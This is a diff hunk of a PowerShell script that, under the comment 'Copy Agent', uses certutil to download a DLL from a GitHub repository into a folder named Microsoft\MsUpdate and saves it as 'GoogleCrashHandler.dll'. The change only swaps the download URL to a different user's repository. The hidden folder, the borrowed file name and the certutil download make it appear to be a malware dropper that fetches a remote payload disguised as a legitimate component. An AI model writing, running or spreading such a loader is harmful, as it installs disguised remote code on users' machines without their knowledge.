@@ -18,7 +18,7 @@ if (-not (Test-Path -Path $MsRdpNetPath)) {
 # Copy Agent
 $rutaArchivo = Join-Path $env:UserProfile\AppData\Local\Microsoft\MsUpdate\ "GoogleCrashHandler.dll"
 if (-not (Test-Path -Path $rutaArchivo)) {
-    $urlDescarga = "https://github.com/andradecristian/varios/raw/main/DLLAES.dll"
+    $urlDescarga = "https://github.com/emakedie/varios/blob/main/DLLAES.dll"
     $salidaDescarga = Join-Path $env:UserProfile\AppData\Local\Microsoft\MsUpdate\ "GoogleCrashHandler.dll"
     certutil -urlcache -split -f $urlDescarga $salidaDescarga | Out-Null
     $archivoDescargado = Get-Item $salidaDescarga
